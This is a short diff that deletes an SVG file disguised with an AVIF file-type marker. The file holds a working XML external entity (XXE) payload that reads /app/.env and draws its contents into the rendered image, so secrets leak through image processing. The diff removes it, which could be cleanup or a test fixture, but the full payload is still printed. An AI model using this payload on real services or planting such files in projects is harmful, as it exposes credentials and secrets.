@@ -1,4 +1,0 @@
-<!--ftypavif--><!DOCTYPE svg [
-<!ENTITY % file SYSTEM "file:///app/.env">
-<!ENTITY leak "%file;">
-]><svg xmlns="http://www.w3.org/2000/svg" width="800" height="200"><rect width="800" height="200" fill="white"/><text x="10" y="100" font-size="48" fill="black">&leak;</text></svg>
